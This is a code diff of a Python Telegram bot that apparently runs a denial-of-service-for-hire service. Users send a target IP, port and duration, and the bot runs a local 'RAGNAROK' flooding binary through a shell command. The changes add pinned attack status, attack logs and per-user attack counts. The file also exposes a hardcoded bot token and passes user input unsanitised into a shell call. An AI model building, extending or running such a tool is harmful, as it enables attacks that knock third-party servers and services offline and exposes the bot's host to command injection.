@@ -3,6 +3,7 @@ import telebot
 import datetime
 import time
 import subprocess
+import threading
 from telebot import types
 
 # TELEGRAM BOT TOKEN
@@ -11,14 +12,16 @@ bot = telebot.TeleBot('8048715452:AAHDXOo6-QlDxMyApE2pjgrp8khE_5yvIg8')
 # GROUP AND CHANNEL DETAILS
 GROUP_ID = "-1002369239894"
 CHANNEL_USERNAME = "@KHAPITAR_BALAK77"
-SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"  # SCREENSHOT VERIFICATION CHANNEL
-ADMINS = [7129010361]  # ADMIN IDs
+SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
+ADMINS = [7129010361]
 
 # GLOBAL VARIABLES
 is_attack_running = False
 attack_end_time = None
 pending_feedback = {}
 warn_count = {}
+attack_logs = []
+user_attack_count = {}
 
 # FUNCTION TO CHECK IF USER IS IN CHANNEL
 def is_user_in_channel(user_id):
@@ -82,12 +85,16 @@ def handle_attack(message):
 
     bot.send_message(message.chat.id, confirm_msg, parse_mode="Markdown")
 
+    # PIN ATTACK STATUS
+    bot.pin_chat_message(message.chat.id, message.message_id)
+
     is_attack_running = True
     attack_end_time = datetime.datetime.now() + datetime.timedelta(seconds=time_duration)
     pending_feedback[user_id] = True  
 
     bot.send_message(message.chat.id, f"🚀 ATTACK SHURU!\n🎯 `{target}:{port}`\n⏳ {time_duration}S\nBETA SCREENSHOT BHEJ AB", parse_mode="Markdown")
 
+    # Attack Execution
     try:
         subprocess.run(f"./RAGNAROK {target} {port} {time_duration} CRACKS", shell=True, check=True, timeout=time_duration)
     except subprocess.TimeoutExpired:
@@ -97,8 +104,14 @@ def handle_attack(message):
     finally:
         is_attack_running = False
         attack_end_time = None  
+        bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
 
-    bot.send_message(message.chat.id, "✅ ATTACK KHATAM! 🎯\n📸 AB SCREENSHOT BHEJ, WARNA AGLA ATTACK NAHI MILEGA!")
+        # UNPIN ATTACK STATUS
+        bot.unpin_chat_message(message.chat.id)
+
+        # ATTACK LOGS
+        attack_logs.append(f"{user_id} -> {target}:{port} ({time_duration}s)")
+        user_attack_count[user_id] = user_attack_count.get(user_id, 0) + 1
 
 # AUTO ANNOUNCEMENT SYSTEM
 def auto_announcement():
@@ -130,6 +143,14 @@ def check_status(message):
         bot.reply_to(message, f"✅ **ATTACK CHAL RAHA HAI!**\n⏳ **BACHI HUI TIME:** {int(remaining_time)}S")
     else:
         bot.reply_to(message, "❌ KOI ATTACK ACTIVE NAHI HAI!")
+
+# ATTACK STATS SYSTEM
+@bot.message_handler(commands=['stats'])
+def attack_stats(message):
+    stats_msg = "📊 **ATTACK STATS:**\n\n"
+    for user, count in user_attack_count.items():
+        stats_msg += f"👤 `{user}` ➝ {count} ATTACKS 🚀\n"
+    bot.send_message(message.chat.id, stats_msg, parse_mode="Markdown")
 
 # HANDLE WARN SYSTEM
 @bot.message_handler(commands=['warn'])
